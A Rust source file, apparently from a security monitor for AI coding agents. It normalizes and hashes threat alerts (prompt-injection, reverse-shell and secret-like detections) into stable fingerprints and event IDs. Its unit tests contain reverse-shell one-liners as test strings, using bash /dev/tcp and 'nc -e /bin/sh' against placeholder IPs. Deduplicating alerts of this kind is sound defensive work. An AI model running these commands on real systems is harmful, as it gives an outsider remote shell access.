use sha2::{Digest, Sha256};
use uuid::Uuid;

/// Normalize threat text so exec/span/session/bucket paths collapse to one key.
pub fn normalize_piece(s: &str) -> String {
    let mut t = s.trim().to_ascii_lowercase();
    const PREFIXES: &[&str] = &[
        "remote-control:",
        "prompt:",
        "secret-like:",
        "shell:",
        "text:",
        "cmd:",
        "req:",
        "res:",
        "net:",
        "file:",
        "span text matched prompt-injection heuristics ·",
        "span text matched remote-control / reverse-shell heuristics ·",
        "span text matched secret-like patterns ·",
        "exec text matched prompt-injection heuristics ·",
        "exec text matched remote-control / reverse-shell heuristics ·",
        "exec text matched secret-like patterns ·",
        "bucket text matched prompt-injection heuristics ·",
        "bucket text matched remote-control / reverse-shell heuristics ·",
        "bucket text matched secret-like patterns ·",
        "session text matched prompt-injection heuristics ·",
        "session text matched remote-control / reverse-shell heuristics ·",
        "session text matched secret-like patterns ·",
    ];
    loop {
        let before = t.clone();
        for p in PREFIXES {
            if let Some(rest) = t.strip_prefix(p) {
                t = rest.trim_start().to_string();
            }
        }
        if t == before {
            break;
        }
    }
    t.split_whitespace().collect::<Vec<_>>().join(" ")
}

/// Stable hex fingerprint for a threat piece.
pub fn fingerprint_piece(piece: &str) -> String {
    let norm = normalize_piece(piece);
    let mut hasher = Sha256::new();
    hasher.update(norm.as_bytes());
    hex::encode(hasher.finalize())
}

/// Deterministic id for alert / decision rows so repeats upsert/ignore instead of duplicating.
pub fn stable_event_id(agent: Option<&str>, flag: &str, piece: &str, kind: &str) -> Uuid {
    let key = format!(
        "archimede|{kind}|{}|{}|{}",
        agent.unwrap_or("-"),
        flag,
        fingerprint_piece(piece)
    );
    let mut hasher = Sha256::new();
    hasher.update(key.as_bytes());
    let dig = hasher.finalize();
    let mut bytes = [0u8; 16];
    bytes.copy_from_slice(&dig[..16]);
    // Set UUID version/variant bits for a valid RFC layout (v4-shaped from hash).
    bytes[6] = (bytes[6] & 0x0f) | 0x40;
    bytes[8] = (bytes[8] & 0x3f) | 0x80;
    Uuid::from_bytes(bytes)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn same_threat_different_prefixes_same_fp() {
        let a = fingerprint_piece("remote-control: bash -i >& /dev/tcp/1.2.3.4/44");
        let b = fingerprint_piece("BASH -i >& /dev/tcp/1.2.3.4/44");
        assert_eq!(a, b);
    }

    #[test]
    fn stable_ids_match_across_sources() {
        let id1 = stable_event_id(Some("cursor"), "remote_control_hint", "nc -e /bin/sh 1.1.1.1 443", "alert");
        let id2 = stable_event_id(
            Some("cursor"),
            "remote_control_hint",
            "remote-control: nc -e /bin/sh 1.1.1.1 443",
            "alert",
        );
        assert_eq!(id1, id2);
    }
}
